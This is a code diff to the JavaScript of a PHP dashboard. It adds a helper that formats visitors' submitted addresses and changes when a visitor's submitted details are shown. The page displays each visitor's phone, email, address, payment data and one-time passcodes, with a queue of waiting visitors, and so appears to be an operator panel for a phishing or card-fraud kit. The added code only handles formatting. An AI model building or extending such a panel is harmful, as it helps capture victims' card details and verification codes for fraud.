@@ -168,6 +168,19 @@ $visitorWaiting = $db->query("SELECT COUNT(*) as cnt FROM visitors WHERE status 
 <script>
 function esc(s) { const d=document.createElement('div'); d.textContent=s||''; return d.innerHTML; }
 
+function addressHTML(raw) {
+    if (!raw) return '';
+    try {
+        const a = typeof raw === 'string' ? JSON.parse(raw) : raw;
+        if (a.street) {
+            return `<div class="vw-submitted-row"><span class="lbl">Street</span><span class="val">${esc(a.street)}</span></div>
+                <div class="vw-submitted-row"><span class="lbl">City</span><span class="val">${esc(a.city||'')}${a.state ? ', '+esc(a.state) : ''} ${esc(a.zip||'')}</span></div>
+                <div class="vw-submitted-row"><span class="lbl">Country</span><span class="val">${esc(a.country||'')}</span></div>`;
+        }
+    } catch(e) {}
+    return `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(raw)}</span></div>`;
+}
+
 function flag(code) {
     if (!code||code.length!==2) return '';
     return String.fromCodePoint(code.charCodeAt(0)-65+0x1F1E6, code.charCodeAt(1)-65+0x1F1E6);
@@ -286,7 +299,7 @@ function updateCard(v) {
         }
     }
     // Show submitted data if appeared
-    if (v.name && v.address && !el.querySelector('.vw-submitted')) {
+    if (v.name && (v.address || v.phone) && !el.querySelector('.vw-submitted')) {
         const ident = el.querySelector('.vw-identity');
         if (ident) {
             const div = document.createElement('div');
@@ -295,7 +308,7 @@ function updateCard(v) {
             div.innerHTML = `
                 ${v.phone ? `<div class="vw-submitted-row"><span class="lbl">Phone</span><span class="val">${esc(v.phone)}</span></div>` : ''}
                 ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
-                ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
+                ${addressHTML(v.address)}
                 ${paymentHTML(v)}
                 ${otpHTML(v)}`;
             ident.after(div);
@@ -314,7 +327,7 @@ function updateCard(v) {
         sub.innerHTML = `
             ${v.phone ? `<div class="vw-submitted-row"><span class="lbl">Phone</span><span class="val">${esc(v.phone)}</span></div>` : ''}
             ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
-            ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
+            ${addressHTML(v.address)}
             ${paymentHTML(v)}
             ${otpHTML(v)}`;
     }
@@ -352,7 +365,7 @@ function buildInner(v) {
         <div class="vw-submitted" data-u="submitted">
             ${v.phone ? `<div class="vw-submitted-row"><span class="lbl">Phone</span><span class="val">${esc(v.phone)}</span></div>` : ''}
             ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
-            ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
+            ${addressHTML(v.address)}
             ${paymentHTML(v)}
             ${otpHTML(v)}
         </div>` : ''}
